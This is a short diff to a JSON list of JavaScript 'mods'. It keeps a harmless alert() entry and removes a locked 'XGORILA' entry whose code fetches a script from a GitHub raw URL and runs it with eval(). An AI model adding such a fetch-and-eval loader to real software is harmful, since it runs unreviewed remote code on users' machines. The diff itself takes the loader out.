@@ -2,12 +2,5 @@
  {"directory":"run-js",
  "descripsion":"in this mod you can run javascript code",
  "display":"run javascript",
- "code":"alert()"},
-{
-  "directory": "XGORILA",
-  "description": "xgorila",
-  "display": "X-GORILA",
-  "code": "async function a(){eval(await fh('https://raw.githubusercontent.com/kenzz-sz/Zynx_/refs/heads/main/XGORILA.json'))} a()",
-  "password": "locked"
-}
+ "code":"alert()"}
 ]
